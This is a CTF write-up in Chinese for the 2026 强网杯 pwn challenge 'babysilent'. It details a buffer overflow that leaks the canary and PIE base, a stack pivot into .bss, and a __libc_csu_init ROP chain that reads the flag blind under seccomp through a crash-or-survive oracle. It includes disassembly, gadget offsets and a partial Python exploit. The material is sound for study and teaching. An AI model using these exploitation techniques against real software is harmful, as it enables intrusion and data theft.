# babysilent（2026强网杯）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 混合题（附件+靶机） |
| 附件 | pwn、wrapper、ld-linux-x86-64.so.2、libc.so.6 |
| 目标 | nc * <TARGET_PORT> |

Flag：flag{动态容器已脱敏}

题面只有一句“嘘~ keep silent!”，对应程序在进入盲读阶段前关闭stdout/stderr并装入seccomp，只能靠连接存活与否逐字节盲读flag。

## 2. 题目分析

这是一道“盲读”题：

1. `main`的名字缓冲区只有`0x58`字节，但允许输入`0x88`字节；
2. 第一次输入只覆盖canary的最低位，`printf("%s")`会把canary其余7字节以及保存的`rcx`（`__libc_csu_init`）一起打印出来，从而同时泄露canary和PIE基址；
3. 第二次输入恢复canary，覆盖保存的`rbp`/返回地址，把栈迁移到`.bss`；
4. 进入`blind()`后stdout/stderr被关闭，并装入seccomp过滤器，只允许`read`、`exit`、`exit_group`；flag文件在seccomp之前已被`open`，固定占用fd 3；
5. 用`__libc_csu_init`的ROP gadget从fd 3逐字节读取flag，并用一个256项函数表做“命中/不命中”分支：
   - 命中：跳到`leave; ret`，进入一个只消费换行符的`read`循环，进程保持存活；
   - 不命中：`call NULL`，进程崩溃，wrapper在下次转发数据时收到EPIPE/POLLERR，关闭连接。
6. 由于每个字节只能判断“是否属于某个集合”，先把flag按UUID结构拆成十六进制位，每位做4次集合测试，再做一次精确字符验证；失败则退回7位ASCII逐位测试。

最终结果：已成功取得并验证，具体内容已隐藏。

### 程序结构与保护

##### 保护

```text
Arch:     amd64
PIE:      enabled
Canary:   enabled
NX:       enabled
RELRO:    full
Seccomp:  read(0), exit(60), exit_group(231) 允许，其余返回 EPERM
```

`main`开头把`rcx`存到了`[rbp]`，这不是普通编译器会做的事，而是题目故意留下的PIE泄露源。

##### main

关键反汇编（地址相对于pwn的PIE偏移）：

```asm
0x200452  main:
          push rbp
          mov  rbp, rsp
          sub  rsp, 0x70
          ...
          mov  qword ptr [rbp - 0x60], 0   ; name buffer
          ...
          mov  qword ptr [rbp], rcx        ; 故意保存 __libc_csu_init
          mov  dword ptr [rbp - 0x64], 0   ; size
          call init
          call open_flag                   ; fd 3 = flag
          lea  rdi, "Please input your name size: "
          call printf
          call getnum
          mov  [rbp - 0x64], eax
          cmp  dword ptr [rbp - 0x64], 0x88
          jbe  ok
          mov  edi, -1
          call exit
ok:       lea  rdi, "Please input your name: "
          call printf
          mov  edx, [rbp - 0x64]
          lea  rax, [rbp - 0x60]
          call get_input                   ; 第一次名字
          lea  rax, [rbp - 0x60]
          lea  rdi, "Your name is: %s\n"
          call printf                      ; 泄露点
          lea  rdi, "Now you have 1 choice to change your name.\n"
          call printf
          mov  edx, [rbp - 0x64]
          lea  rax, [rbp - 0x60]
          call get_input                   ; 第二次名字
          mov  edi, 1
          call sleep
          call blind                       ; close(1), close(2), seccomp
          ...
          mov  rcx, [rbp - 8]
          xor  rcx, fs:[0x28]
          je   leave
          call __stack_chk_fail
leave:    leave
          ret
```

栈布局：

```text
rbp - 0x60 : name[0x58]       <- 缓冲区起点
rbp - 0x08 : stack canary
rbp + 0x00 : saved rbp
rbp + 0x08 : saved rip
```

名字最多可写`0x88`字节，因此可以覆盖canary、saved rbp和saved rip。

##### get_input / getnum

`get_input(dest, count)`：

```asm
0x20031c  get_input:
          ...
          mov  dword ptr [rbp - 0x1c], esi   ; count
          mov  dword ptr [rbp - 0xc], 0      ; i
loop:     lea  rax, [rbp - 0xd]
          mov  edx, 1
          mov  rsi, rax
          mov  edi, 0
          call read
          cmp  rax, 1
          je   have_byte
          mov  edi, -1
          call exit                         ; EOF -> exit(-1)
have_byte:
          movzx eax, byte ptr [rbp - 0xd]
          cmp  al, 0xa
          je   done                         ; 换行结束
          mov  eax, [rbp - 0xc]
          movsxd rdx, eax
          mov  rax, [rbp - 0x18]
          add  rdx, rax
          mov  byte ptr [rdx], al           ; dest[i] = c
          add  dword ptr [rbp - 0xc], 1
          cmp  [rbp - 0x1c], eax
          ja   loop
done:     ...
          leave
          ret
```

- 逐字节`read(0, &c, 1)`；
- 读到EOF（`read`返回值不为1）时直接`exit(-1)`；
- 读满`count`或遇到`\n`停止；
- **不会写NUL终止符**，所以`printf("%s")`会一直打印到内存中下一个`0x00`。

`getnum()`一次`read(0, buf, 15)`后`atoi`。本EXP用`"136\n" + "A"*11`正好占满15字节，`atoi`只看到`136`，同时把后面11个`A`一起吃掉。

##### open_flag / blind / setup_sandbox

```asm
0x200409  open_flag:
          lea  rdi, "flag"
          xor  esi, esi
          call open
          ret                     ; 返回值被丢弃，但 fd 一定是 3

0x20042d  blind:
          mov  edi, 1
          call close              ; 关闭 stdout
          mov  edi, 2
          call close              ; 关闭 stderr
          call setup_sandbox
          ret
```

`setup_sandbox`创建seccomp过滤器：

- 默认动作`seccomp_init(0x50001)`，即`SCMP_ACT_ERRNO(EPERM)`；
- 允许三个系统调用：
  - `read` (0)
  - `exit` (60)
  - `exit_group` (231)
- 因此之后不能`write`、不能`open`、不能`execve`，只能读fd和退出。

flag在`blind()`之前已经打开，0/1/2被占用，所以flag的fd固定为**3**。

### 信息泄露

##### 覆盖canary最低字节

x86-64的canary最低字节固定为`0x00`，`printf("%s")`遇到它就会停止。第一次名字输入：

```text
0x58 个 'A'  +  'B'
```

- `0x58`个`A`填满缓冲区；
- `'B'`（`0x42`）覆盖canary最低字节`0x00`；
- canary高7字节不变，`printf`不会在canary处停止；
- 继续打印saved rbp，而`main`在开头把`rcx`存到了`[rbp]`，其值为`__libc_csu_init`的地址。

打印内容：

```text
Your name is: AAAA...AAAB<canary[1:8]><saved rcx 的低字节...>\n
```

##### 解析

```python
leak[0x00:0x58] = b"A" * 0x58
leak[0x58]      = b"B"
leak[0x59:0x60] = canary[1:8]     # 7 字节
leak[0x60:0x68] = saved rcx       # 低 6 字节左右

canary = b"\x00" + leak[0x59:0x60]
base   = u64(leak[0x60:0x68]) - 0x2005a0
```

其中`0x2005a0`是`__libc_csu_init`的偏移。检查`base & 0xfff == 0`即可确认PIE基址正确。

##### 重试条件

以下情况直接换连接重来：

- 泄露长度不足`0x60`（canary或地址中间出现`0x00`，`printf`提前截断）；
- 泄露前缀不是`A*0x58 + B`；
- PIE基址不是页对齐；
- canary或ROP payload中出现`0x0a`（会被`get_input`当成换行提前结束）。

### 盲读oracle

##### `__libc_csu_init` gadget

```asm
0x2005fa  pop rbx
0x2005fb  pop rbp
0x2005fc  pop r12
0x2005fe  pop r13
0x200600  pop r14
0x200602  pop r15
0x200604  ret

0x2005e0  mov rdx, r15
0x2005e3  mov rsi, r14
0x2005e6  mov edi, r13d
0x2005e9  call qword ptr [r12 + rbx*8]
0x2005ed  add rbx, 1
0x2005f1  cmp rbx, rbp
0x2005f4  jne 0x2005e0
...
```

用它可以把“任意函数指针+三个参数”串起来：

```text
pop rbx=0, rbp=1, r12=&read@got, r13=fd, r14=buf, r15=count
call [r12]  ->  read(fd, buf, count)
```

##### 把flag字节写进未来的rbx

对目标offset：

1. 先`read(3, scratch, offset)`，把fd 3的文件偏移推进到目标字节；
2. 再`read(3, 目标地址, 1)`，把flag字节写到“下一组CSU pop的rbx槽位”的最低字节。

payload中该qword的高7字节本来就是0，所以1字节写入后：

```text
rbx = flag_byte
```

特殊处理**offset 10**：

- `p64(10)`的最低字节是`0x0a`；
- 这会让`get_input`误以为输入结束；
- 所以把“跳过10字节”拆成两次`read(3, scratch, 5)`。

##### 256项函数表

在`dst + 0x380`放256个qword：

```python
table[c] = leave_gadget if accepted(c) else 0
```

下一组CSU pop设置为：

```text
rbx = flag_byte
rbp = loop_area + 16
r12 = table
r13 = 0
r14 = 0
r15 = 1
```

CSU call执行：

```asm
call qword ptr [table + flag_byte*8]
```

- **命中**：调用`leave; ret`，利用`rbp = loop_area + 16`把栈pivoted到accepted循环；
- **不命中**：调用地址0，进程崩溃。

##### accepted循环

`leave`之后：

```text
rsp = loop_area + 16
pop rbp = [loop_area + 16] = 0
ret     = [loop_area + 24] = 0x200180   ; pop rbp; ret
```

随后：

```text
0x200180: pop rbp = frame + 13
          ret     = pop rdi
pop rdi = 0
pop rsi = frame; pop r15 = 0
rdx 仍是 CSU call 设置的 1
read@plt -> read(0, frame, 1)
ret -> 0x200359（get_input 内部）
```

`0x200359`是`get_input`的返回值检查：

```asm
0x200359  cmp rax, 1
0x20035d  je  0x200369
0x20035f  mov edi, -1
0x200364  call exit
```

- 读到1字节且是`\n`：走`get_input`的正常收尾，canary校验通过，`leave; ret`回到`loop_area`，继续循环；
- 读到EOF（`rax = 0`）：`exit(-1)`，进程退出；
- 读到非`\n`字节：`get_input`的写入路径会用到`[frame - 5]`，该处为0，相当于向NULL写，进程崩溃。

**因此心跳必须只发`\n`。**

accepted循环中的回收链：

```text
frame[0]      = 0
frame[5:13]   = canary
frame[13:21]  = 0
frame[21:29]  = p64(POP_RSP)
frame[29:37]  = p64(loop_area)
```

`get_input`在`rbp = frame + 13`下检查`[rbp-8] = frame+5`的canary，然后`leave; ret`回到`loop_area`。

##### 单字节判定

一次查询只回答：**“flag[offset]是否属于集合S？”**

- 若属于，表项为`leave`，进程进入循环，保持存活；
- 若不属于，表项为0，进程崩溃，wrapper关闭连接。

所以：

- 对十六进制位，做4次“该位是否为1”的测试：
  ```python
  S_bit = {HEX[i] for i in range(16) if i & (1 << bit)}
  ```
  得到4位后拼出`0..15`，再查`HEX`得到候选字符；
- 对普通ASCII，可直接测试7个比特：
  ```python
  selector = 1 << bit     # 整数选择器表示 (c & selector) != 0
  ```
- 最后用`{candidate}`做一次精确验证。

```text
Please input your name size:
Please input your name:
```
```python
try:
    p.recv(timeout=5)
    alive = True
except EOFError:
    alive = False
```
```python
t.send(b"\n" * 256 * 1024)
deadline = time.time() + 2.0
while time.time() < deadline:
    try:
        t.send(b"\n" * 2048)
    except (EOFError, BrokenPipeError):
        return False
    try:
        t.recv(timeout=0.02)      # 排空，忽略
    except EOFError:
        return False
return True
```

### 求解算法

本题flag结构为UUID：

```text
flag{...}
 0    5      13   18   23   28         41
```

- 位置0..4：`flag{`；
- 位置13、18、23、28：`-`；
- 位置41：`}`；
- 其余位置：小写十六进制字符。

每个hex位：

1. 做4次bit测试，选择器为“该位为1的十六进制字符集合”；
2. 拼出0..15，得到候选；
3. 用`{candidate}`精确验证；
4. 若验证失败，重复第1~3步（bit结果按OR累积），最多5轮；
5. 仍失败则退回7位ASCII逐位测试。

并发与断点：

- `--parallel 8 --chunk 4`；
- 每解出一个字节写入`--checkpoint`文件；
- 支持`--prefix`从断点继续。

实测：

```text
完整从零求解：约 86 秒（8 并发，chunk=4，budget=2.0s）
逐字节验证 42 字节：约 24 秒，0 mismatch
```

### 关键偏移表

| 名称 | 偏移/地址 |
| --- | --- |
| `main` | `0x200452` |
| `get_input` | `0x20031c` |
| `getnum` | `0x2003aa` |
| `open_flag` | `0x200409` |
| `blind` | `0x20042d` |
| `setup_sandbox` | `0x20022a` |
| `__libc_csu_init` | `0x2005a0` |
| `main+0x92`重入点 | `0x2004e4` |
| CSU `pop*6; ret` | `0x2005fa` |
| CSU `call [r12+rbx*8]` | `0x2005e0` |
| `leave; ret` | `0x20059d` |
| `pop rdi; ret` | `0x200603` |
| `pop rsi; pop r15; ret` | `0x200601` |
| `pop rsp; pop r13; pop r14; pop r15; ret` | `0x2005fd` |
| `pop rbp; ret` | `0x200180` |
| `get_input`返回值检查 | `0x200359` |
| `read@plt` | `0x2000b0` |
| `read@got` | `0x600fa8` |
| `exit@plt` | `0x2000f0` |
| 伪栈`B` | `0x601080` |
| payload `dst` | `0x601400` |
| skip scratch | `0x6010d0` |
| 循环区 | `dst + 0x220` |
| 伪栈帧 | `dst + 0x320` |
| 函数表 | `dst + 0x380` |

### 实测输出

从offset 0全量求解可以完成，逐字节精确校验通过。为避免泄露真实结果，以下仅保留状态输出：

```text
[+] recovered 42 bytes
[+] exact verification passed
[+] sensitive result redacted
```

### 关键代码片段

核心结构：

##### 单字节oracle构建

```python
words = [0, 0, 0]
if offset == 10:
    call_read(3, scratch, 5)
    call_read(3, scratch, 5)
elif offset:
    call_read(3, scratch, offset)

read(3, dst + slot*8, 1)          # 把 flag 字节写进 rbx 槽
call table[flag_byte]             # accepted -> leave; rejected -> 0
```

##### 函数表

```python
table_bytes = b"".join(
    p64(leave if accepted(c) else 0) for c in range(256)
)
```

##### 存活判定

```python
t.send(b"\n" * 256 * 1024)
deadline = time.time() + 2.0
while time.time() < deadline:
    try:
        t.send(b"\n" * 2048)
    except (EOFError, BrokenPipeError):
        return False
    try:
        t.recv(timeout=0.02)
    except EOFError:
        return False
return True
```

##### 单字节求解

```python
value = 0
for _ in range(5):
    for bit in range(4):
        if probe(offset, {HEX[i] for i in range(16) if i & (1 << bit)}):
            value |= 1 << bit
    candidate = HEX[value]
    if probe(offset, {candidate}):
        return candidate
return ascii_byte(offset)
```

## 3. 解题过程

### 第一次返回：回到main的输入循环

第二次名字输入（正好`0x88`字节）：

```text
'A' * 0x58
canary
p64(B + 0x60)        ; 新的 saved rbp
p64(main + 0x92)     ; 0x2004e4，重新进入 getnum/get_input 流程
'A' * 0x18
```

其中`B = base + 0x601080`，位于`.bss`的可写页内。

`main`在`sleep(1)`、`blind()`之后执行`leave; ret`：

- `rsp = rbp = B + 0x60`；
- `pop rbp`得到`B`；
- `ret`到`main+0x92`。

注意：这个入口会再次执行`getnum()`和两次`get_input()`，正好把伪栈写进`.bss`。

### 写伪栈

重新进入后：

1. `getnum()`读走15字节`"136\n" + "A"*11`，返回136；
2. 第一次`get_input(B, 136)`写入blob；
3. 第二次`get_input(B, 136)`再写一次同样的blob。

blob结构：

```text
stage2.ljust(0x58, b"\0")
canary
p64(B)                 ; saved rbp
p64(base + 0x20059d)   ; leave; ret
```

两次写入同样的内容，随后`main`再次`leave; ret`：

- 第一次`leave`：`rbp = B`，`ret`到`leave`；
- 第二次`leave`：`rsp = B`，`pop rbp = stage2[0]`，`ret`到`stage2[1]`。

### stage2：读入大payload并pivot

stage2由9个qword组成：

```python
stage2 = [
    0,
    base + POP_RDI,        # 0x200603
    dst,
    base + POP_RSI_R15,    # 0x200601
    len(payload), 0,
    base + GET_INPUT,      # 0x20031c
    base + POP_RSP,        # 0x2005fd
    dst,
]
```

执行效果：

```text
pop rdi = dst
pop rsi = len(payload); pop r15 = 0
get_input(dst, len(payload))     ; 读入大 payload
pop rsp = dst
pop r13, pop r14, pop r15        ; 吃掉 payload 前 3 个 qword
ret                              ; 从 payload[3] 开始执行
```

`POP_RSP`的完整gadget是：

```asm
0x2005fd: pop rsp
0x2005fe: pop r13
0x200600: pop r14
0x200602: pop r15
0x200604: ret
```

所以payload开头必须有3个填充qword。

### payload布局

`dst = base + 0x601400`：

```text
dst + 0x000 : ROP 链
dst + 0x220 : accepted 分支使用的 read 循环
dst + 0x320 : 伪 get_input 栈帧
dst + 0x380 : 256 项函数表
```

payload总长约为`0x380 + 0x800 = 0xb80`，全部通过`get_input`二进制写入，不经过`printf`。

## 4. PoC

```PYTHON
    end = data.index(b"\nNow you have")
    leak = data[start:end]
    if len(leak) < 0x60:
        raise RuntimeError("short leak %d" % len(leak))
    if leak[:0x58] != b"A" * 0x58 or leak[0x58:0x59] != b"B":
        raise RuntimeError("bad leak prefix")
    canary = b"\x00" + leak[0x59:0x60]
    saved_rcx = u64x(leak[0x60:0x68])
    base = saved_rcx - MAIN_CSU_INIT
    if base & 0xFFF or base == 0:
        raise RuntimeError("bad PIE base %#x" % base)
    return canary, base

# ------------------------------ stage builder ------------------------------
def build_bit_oracle(base, canary, offset, selector):
    """Return (stage2_blob, payload) for one oracle query."""
    bss = base + 0x601050
    dst = base + DST_OFF
    loop_area = dst + 0x220
    frame_addr = dst + 0x320
    table = dst + 0x380
    scratch = base + SCRATCH_OFF
    csu_pop = base + CSU_POP
    csu_call = base + CSU_CALL
    leave = base + LEAVE
    read_got = base + READ_GOT
    read_plt = base + READ_PLT
    words = [0, 0, 0]

    def call_read(fd, address, count):
        words.extend([csu_pop, 0, 1, read_got, fd, address, count, csu_call])
        words.extend([0] * 7)

    if offset == 10:
        # p64(10) contains 0x0a, which would terminate get_input early.
        call_read(3, scratch, 5)
        call_read(3, scratch, 5)
    elif offset:
        call_read(3, scratch, offset)

    dest_index = len(words) + 5
    call_read(3, 0, 1)                      # overwritten by dest_index below
    char_index = len(words) + 1
    words.extend([csu_pop, 0, loop_area + 16, table, 0, 0, 1, csu_call])
    words[dest_index] = dst + char_index * 8
```
